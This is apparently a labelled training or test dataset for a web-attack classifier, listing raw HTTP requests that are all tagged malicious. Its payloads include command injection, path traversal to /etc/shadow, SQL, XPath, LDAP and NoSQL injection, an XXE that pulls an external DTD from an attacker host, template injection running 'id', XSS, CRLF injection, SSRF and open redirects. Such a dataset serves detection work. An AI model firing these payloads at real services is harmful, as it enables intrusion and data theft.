"text","label"
"POST /feedback/submit HTTP/1.1
Host: feedback-portal.org
User-Agent: Python-urllib/3.9
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: identity
Content-Length: 66

comment=Great%20service%21%0auptime%0ancat%20%2Fetc%2Fpasswd","malicious"
"POST /input/user-signature HTTP/1.1
Host: nextgen-filter-hub.dev
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 185
Referer: https://nextgen-filter-hub.dev/input
Connection: keep-alive

user_signature_check=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaZ","malicious"
"GET /service/status/device123%20%7C%20hostname%20%7C%20whoami HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: close","malicious"
"GET /files/.%2E%2F.%2E%2F.%2E%2Fetc/hosts HTTP/1.1
Host: cdn-public-assets.deepstatic.site
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: en-GB,en;q=0.9
Connection: keep-alive","malicious"
"GET /api/v3/utility/lookup/ip-10.0.0.5%20%7C%20hostname%20%7C%20whoami HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.68.0
Accept: */*
Connection: keep-alive","malicious"
"GET /members/search?member_id=789&member%5Fid=789%27%20OR%201%3D1 HTTP/1.1
Host: forum-tech-support.io
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept-Encoding: gzip, br, deflate
Accept: application/json, text/plain, */*
Pragma: no-cache","malicious"
"GET /service/lookup?filter=all&id=123&id=%27%20UNION%20SELECT%20credit_card%20FROM%20users--&filter_evil_chars=true HTTP/1.1
Host: data-ingestion-hub.cloud
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Referer: https://data-ingestion-hub.cloud/home
Cache-Control: no-cache
Connection: keep-alive","malicious"
"POST /api/v3/items/search HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json, text/plain, */*
Content-Type: text/plain
Content-Length: 84
Origin: https://online-retail-store.biz
Cookie: sid=12345abcdef67890ghijk

user%5Bemail%5D=buyer%40onlineretail.biz&user%5Bis_premium%5D=1&user%5Broles%5D%5B%5D=admin&user%5Broles%5D%5B%5D=staff","malicious"
"GET /user/data/export HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: curl/7.77.0
Accept: */*
X-User-Filter: {""$where"": ""if (this.isAdmin) { var date = new Date(); while((new Date()) - date <= 5000) { /* busy_wait */ } }; return true;""}
Connection: close","malicious"
"PUT /api/v1/tasks/modify HTTP/1.1
Host: api.edge-routing-cloud.org
Content-Type: application/json
User-Agent: curl/7.77.0
Accept: */*
Cache-Control: no-cache
Content-Length: 138

{""task_name"":""backup_sync"",""target_host"":""backup-server.internal || nslookup evil-payload-secure.net"",""options"":{""retry"":3,""timeout"":120}}","malicious"
"POST /data/ingest HTTP/1.1
Host: metrics-api.corporate-analytics.org
User-Agent: Python-urllib/3.9
Content-Type: application/json
Accept: application/json
X-Webhook-URL: http://callback-requests.delay-checker.tech/uuid-914743
Content-Length: 65
Cache-Control: max-age=0

{""metric"":""cpu_load"",""value"":0.78,""timestamp"":""2024-06-01T15:22:30Z""}","malicious"
"POST /service/upload HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Content-Type: application/xml
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Cache-Control: no-cache
Pragma: no-cache
Content-Length: 263

<!DOCTYPE doc [
<!ENTITY % file SYSTEM ""file:///var/log/auth.log"">
<!ENTITY % dtd SYSTEM ""http://attacker-portal.biz/malicious.dtd"">
%dtd;
%send;
]>
<request>
  <name>upload</name>
  <value>filedata</value>
</request>","malicious"
"GET /blog/article.shtml?user_greeting=Hello<!--#Exec cmd=""ls%20-la""--> HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive","malicious"
"GET /api/v1/ldap?employee=%2A%29%28department%3Dengineering%29 HTTP/1.1
Host: api.hr-database.biz
User-Agent: curl/7.77.0
Accept: */*
Connection: close","malicious"
"POST /authentication HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate, br
Content-Length: 121
Cookie: authToken=fd92a1bc8e0e4f649d3f2ed670a480b1
Connection: keep-alive

email=' or substring(//clients/client[1]/concat(substring(password,1,2), '##'),1,1)='p'&password=pass123","malicious"
"GET /app/user/settings/theme-dark%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0a%0d%0aInjectedBodyHere HTTP/1.1
Host: secure-user-portal.net
User-Agent: Python-urllib/3.9
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://secure-user-portal.net/app/dashboard
Connection: close","malicious"
"POST /app/user/settings/update HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Referer: https://trusted-partner-site.net/allowed_path
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Cookie: sessionid=63b1fa9c7e2f3a4f8d7d2a09b5f41670; secure=True
Connection: keep-alive

email_notifications=0&theme=dark&language=en-US","malicious"
"POST /api/v1/user/settings HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Origin: https://api.cloud-data-services.ai
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Cache-Control: no-cache
Content-Length: 69
Connection: close

user_bio=Experienced+developer+%3C%21--%23InClUdE+fIlE%3D%22%2Fvar%2Fwww%2Fsecret.txt%22+--%3E","malicious"
"POST /search/directory HTTP/1.1
Host: enterprise-access-management.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/89.0
Accept: application/json
Content-Type: application/json
Content-Length: 91
X-Requested-With: FetchAPIClient
Origin: https://enterprise-access-management.io

{""searchFilter"": ""(&(cn=employee)(objectClass=user))(|(uid=admin)(uid=superuser))""}","malicious"
"GET /dashboard HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://community.game-dev-forum.org/login
X-User-Filter: {""$where"": ""if (this.isAdmin) { var date = new Date(); while((new Date()) - date <= 5000) { /* busy_wait */ } }; return true;""}
Cache-Control: no-cache","malicious"
"POST /api/v2/session/redirect HTTP/1.1
Host: user-authentication-hub.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
Accept-Language: en-US,en;q=0.9
Content-Length: 245
Connection: keep-alive

{""redirect_url"": ""/login_success%0d%0aX-Custom-Header:%20InjectedValue%0d%0aLocation:%20http://phishing-portal.biz%0d%0a%0d%0a<html><body>Redirecting to phishing site...</body></html>""}","malicious"
"GET /products/details?id=42%27%20UNION%20SELECT%20@@VERSION%2CSLEEP%285%29%2CUSER%28%29--%20 HTTP/1.1
Host: catalog.fastbuy-retail.biz
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Cookie: sessionid=8f3d1a47c9b84e2f9e3b12d7a4f6c0b2; csrftoken=7f9d2c1a3e4b5d6f8a0b1c2d3e4f5a6b","malicious"
"GET /api/v3/items/search HTTP/1.1
Host: search-engine.fashion-tech.ai
X-User-Filter: {""$where"": ""if(this.premium==true){var startTime=new Date(); while((new Date())-startTime<=4500){} } return true;""}
User-Agent: curl/7.77.0
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive","malicious"
"POST /account/update HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 99
Origin: https://api.cloud-data-services.ai
Connection: keep-alive

username=clientuser&action=update&comment=nice_post&username=admin&action=delete&comment=%3Cscript%3Exss()%3C%2Fscript%3E","malicious"
"POST /api/v3/items/search HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/json
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 <!--#echo var=""REMOTE_USER""-->
Accept: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 27

{""search"":""latest gadgets""}","malicious"
"POST /api/v3/config/upload HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: curl/7.77.0
Accept: */*
Content-Type: multipart/form-data; boundary=----uploadBoundary98Hdsl23
Content-Length: 450
Cookie: PHPSESSID=sk8erboiz1234abcdef56789

------uploadBoundary98Hdsl23
Content-Disposition: form-data; name=""uploadName""

gameConfigFile
------uploadBoundary98Hdsl23
Content-Disposition: form-data; name=""configuration""; filename=""configdata.xml""
Content-Type: application/xml

<?xml version=""1.0""?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///c:/windows/win.ini"">]>
<config>&xxe;</config>

------uploadBoundary98Hdsl23--","malicious"
"POST /clientapi/v1/users HTTP/1.1
Host: global-identityportal.us
User-Agent: wget/1.21.1 (linux-gnu)
Accept: application/json
Content-Type: application/json
Content-Length: 91
Cache-Control: max-age=0

{""searchFilter"": ""(memberOf=cn=staff,ou=groups,dc=global-identityportal,dc=us)(|(uid=administrator))""}","malicious"
"POST /api/verify HTTP/1.1
Host: payment-gateway-service.org
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Content-Type: application/json
Accept: application/json
Content-Length: 42

{""transaction_id"": ""TX1234567890"", ""status"": ""ok""}","malicious"
"PUT /v1/account/settings/update HTTP/1.1
Host: api.cloud-data-services.ai
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJlbWFpbCI6ImFsaWNlQG1haWxzZXJ2aWNlcy5jb20iLCJpYXQiOjE2MzAwMDAwMDB9.QqZPcv5uK9VzQ7iJx7kVXT7f1B3E6a8X2n6b4Uo2L5w
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept-Encoding: gzip, deflate, br

{""user_details"":{""name"":""attacker"",""address"":""123 evil st""},""account_info"":{""subscription_level"":""premium"",""override_settings"":{""is_feature_xyz_enabled"":true,""credits_override"":99999}}}","malicious"
"GET /download?resource=..%u2216..%u2216..%u2216etc%u2216shadow HTTP/1.1
Host: online-retail-store.biz
User-Agent: curl/7.77.0
Accept: */*
Connection: close","malicious"
"POST /user/login HTTP/1.1
Host: craft-marketplace.co.uk
User-Agent: Python-urllib/3.9
Content-Type: application/x-www-form-urlencoded
Accept-Charset: utf-8, iso-8859-1;q=0.5
Accept-Language: en-GB,en;q=0.9
Content-Length: 90

loginname=daniel'+and+substring(concat(substring(//user[1]/creditcard,1,5),'ZZ'),3,1)%3D'4&passcode=password123","malicious"
"POST /search/query HTTP/1.1
Host: analytics-datastream.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: application/xml,application/json
Accept-Language: en-US,en;q=0.8
Content-Type: application/xml
Content-Length: 129
Origin: https://analytics-datastream.ai

<searchRequest>
  <term>' or name()=' or 1=1 or ''='</term>
  <category>metrics</category>
</searchRequest>","malicious"
"POST /authenticate HTTP/1.1
Host: login.app-analytics-server.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Content-Length: 63
Connection: keep-alive

username=analytics_user%00%01%08payload<script>console.warn(1)</script>&password=AnalytiCS!789","malicious"
"GET /query_documents?doc_id=42%27%20or%20name%20%3D%20%27admin%27%20or%20%271%27%3D%271 HTTP/1.1
Host: enterprise-docscloud.ai
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Connection: keep-alive","malicious"
"POST /submit HTTP/1.1
Host: data-collector.web-analytics-solutions.ai
User-Agent: Wget/1.21.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Referer: https://web-analytics-solutions.ai/
Connection: keep-alive

message=signup_complete%0d%0a127.0.0.1 - admin [10/Oct/2023:13:55:36 -0700] ""POST /admin/login HTTP/1.1"" 200 789&ref=homepage","malicious"
"GET /content/view/article HTTP/1.1
Host: travel-adventure-guide.net
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
X-User-Filter: {""$where"": ""if (this.isAdmin) { var date = new Date(); while((new Date()) - date <= 5000) { /* busy_wait */ } }; return true;""}
Cache-Control: max-age=0","malicious"
"POST /contact_us/send HTTP/1.1
Host: support-portal-asia.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 182
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Origin: https://support-portal-asia.org
Referer: https://support-portal-asia.org/contact_us

name=John+Doe&email=johndoe%40secure-mailcloud.biz&message=%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))%3C%2Fscript%3E&subject=Website+Inquiry","malicious"
"POST /app/user/settings?message=update_profile%0d%0a127.0.0.1 - root [20/Apr/2024:22:00:00 +0000] ""POST /app/user/settings HTTP/1.1"" 500 1024 HTTP/1.1
Host: portal.my-personal-blog-site.info
Content-Type: application/json
Content-Length: 49
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: application/json
Referer: https://portal.my-personal-blog-site.info/settings
Cache-Control: max-age=0

{""email"":""user@example.com"",""notifications"":true}","malicious"
"POST /api/v1/session/complete HTTP/1.1
Host: user-auth-portal.co
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Referer: https://user-auth-portal.co/login
Content-Length: 61
Cookie: sessionid=ckb847fns94n50ysaj84yxgc1

{""continue_to"": ""https://ads.attacker-net.info/promo""}","malicious"
"GET /search_directory?group=engineering%29%28|(cn=*%29 HTTP/1.1
Host: user-info-service.cloud
User-Agent: Python-urllib/3.9
Accept-Encoding: identity
Accept: */*
Connection: close","malicious"
"POST /api/v1/feedback/submit HTTP/1.1
Host: feedback-portal.enterprise-solutions.org
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Content-Type: application/json
Content-Length: 78
Referer: https://feedback-portal.enterprise-solutions.org/form
Connection: close

{""redirectUrl"":""http://0177.000.000.001:8080/internal/api/verify?user=guest&access=limited""}","malicious"
"GET /content/article/view?id=312 HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15 <!--#config errmsg=""SSI_Fatal_Error_404""-->
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Cache-Control: no-cache
X-Requested-With: XMLHttpRequest
Referer: https://community.game-dev-forum.org/home","malicious"
"GET /xml_api/search_books?book_title=Lord%20of%20the%20Rings%27%20or%20%271%27%3D%271%20or%20%271%27%3D%271 HTTP/1.1
Host: online-retail-store.biz
User-Agent: curl/7.77.0
Accept: */*
Connection: close","malicious"
"POST /api/v2/ldap/search HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: application/json, text/html, */*
Accept-Language: en-US,en;q=0.8
Content-Type: application/json
Content-Length: 92
Connection: keep-alive
Origin: https://online-retail-store.biz
Cookie: token=ab12cd34ef56gh78ij90kl12mn34op56

{""searchFilter"":""(cn=test_user)(objectClass=user))(|(uid=administrator)""}","malicious"
"PUT /v1/user/avatar HTTP/1.1
Host: media-assets.proxy-storage.ai
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Origin: https://media-assets.proxy-storage.ai
Referer: https://media-assets.proxy-storage.ai/app/profile/edit
Accept-Language: en-US,en;q=0.8
Cache-Control: no-cache
Content-Length: 82

{""avatarSource"":""http://0x7F.0x00.0x00.0x01:8080/status?size=large&format=png""}","malicious"
"PUT /service/dataExchange HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Java/1.8.0_291
Content-Type: application/json
Accept-Encoding: gzip, deflate
Content-Length: 292

{
  ""payload"": ""rO0ABXNyABlvcmdcLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXN5TWFwAAAAAAAAAAECAAFJAARtYXB0AAZqYWZhY2V0MTF4cHNyABlqYXZhLmxhbmcuUnVudGltZQAAAAAAAwQAAABleGVj""
}","malicious"
"POST /users/api/v1/ldapsearch HTTP/1.1
Host: corporate-access-layer.biz
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: application/json
Content-Type: application/json
Content-Length: 93

{""searchFilter"": ""(sn=Manager)(objectClass=organizationalPerson))(|(uid=administrator)""}","malicious"
"GET /logout?next=http%3A%2F%2Fmalicious-phishing-site.com HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://secure-user-portal.net/account/settings
Connection: keep-alive","malicious"
"GET /community/game-dev-forum.org/forums/thread/12345 HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept-Language: en-US,en;q=0.5
X-User-Role: admin
Referer: https://community.game-dev-forum.org/forums
Cookie: auth_token=4d2f8e7a9b1c3d5f","malicious"
"POST /app/user/authenticate HTTP/1.1
Host: secure-authentication-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://secure-authentication-portal.net/login
Cookie: SESSIONID=23b7e5a9f84c2b6a02d7080f
Content-Length: 65

username=alice' and substring(//users/user[1]/password,1,1)='a&password=irrelevant","malicious"
"POST /auth/reset-password HTTP/1.1
Host: messaging-cloud-platform.io
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
X-Feedback: <iframe src=""data:text/html;base64,PGh0bWw+PHNjcmlwdD5hbGVydCgncmVzZXQtcGFzc3dvcmQnKTwvc2NyaXB0PjwvaHRtbD4=""></iframe>
Content-Length: 40

email=user@mail.messaging-cloud-platform.io","malicious"
"GET /view/file:///etc/hosts HTTP/1.1
Host: media-gallery-secure-user-portal.net
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.8
Connection: close","malicious"
"PATCH /api/search/items HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Content-Length: 310
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Origin: https://my-personal-blog-site.info
X-Requested-With: FetchAPIClient
Accept: application/json
Accept-Language: en-US,en;q=0.8
Cache-Control: no-cache

{""<img src=x onerror=\""eval(String.fromCharCode(0x61,108,0145,114,0x74,40,0x27,88,0x53,0123,45,0x4b,101,0x79,0x27,41))\"">"": ""search_key"", ""category"": ""tech"", ""max_results"": 25}","malicious"
"GET /dashboard/settings HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Cookie: locale=../../../../usr/local/nginx/conf/nginx.conf%00en_GB; session=3f5e7a1d9b2c
Upgrade-Insecure-Requests: 1","malicious"
"POST /admin/config HTTP/1.1
Host: control-panel.securehost.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Content-Type: application/json
Accept: application/json
X-User-Role: admin
Content-Length: 44

{""max_connections"":100,""enable_logs"":false}","malicious"
"POST /admin/config HTTP/1.1
Host: backend-dev-environment.dev
User-Agent: Python-urllib/3.9
Content-Type: application/javascript
Content-Length: 85
X-Config-Injection: <iframe src=""data:text/html;base64,PHNjcmlwdD5hbGVydCgnRXhlY3V0aW9uIGF0dGVtcHQnKTwvc2NyaXB0Pg==""></iframe>
Accept: */*
Cookie: admin_session=ZTcxZDk4NzQyMzU5MTIzOGRmY2I1MWQxMg==

console.log('No config change');","malicious"
"PUT /api/processJavaObject HTTP/1.1
Host: secure-login-authentication.io
User-Agent: Java/1.8.0_291
Content-Type: application/json
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Length: 314

{
  ""b64_data"": ""rO0ABXNyABtvcmdcLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZhbnR1cmVzLkludm9rZXJUcmFuc2Zvcm1lcgoAAAAAAAMAAQAAeHIAD2phdmEubGFuZy5SdW50aW1lAAAAAAABDAAAZXhlY3Q=""
}","malicious"
"GET /user/profile/%7B%7B%20self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()%20%7D%7D/edit HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: br, deflate, gzip
Upgrade-Insecure-Requests: 1","malicious"
"POST /login HTTP/1.1
Host: attacker-login-portal.biz
User-Agent: Wget/1.21.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Connection: close

username=admin&password=pass1234&redirect=/admin","malicious"
"GET /api/v1/callback?next=https%3A%2F%2Fservices.enterprise-ops-platform.io%2Fdashboard%3Faction%3Dstart%250d%250aSet-Cookie%3A%20role%3Dadmin HTTP/1.1
Host: api.enterprise-ops-platform.io
User-Agent: Python-urllib/3.9
Accept: application/json
Cache-Control: max-age=0
Connection: keep-alive","malicious"
"GET /news/today HTTP/1.1
Host: global-finance-news.biz
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
X-Dynamic-Render: <!--#config errmsg=""AccessDenied""-->
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: keep-alive","malicious"
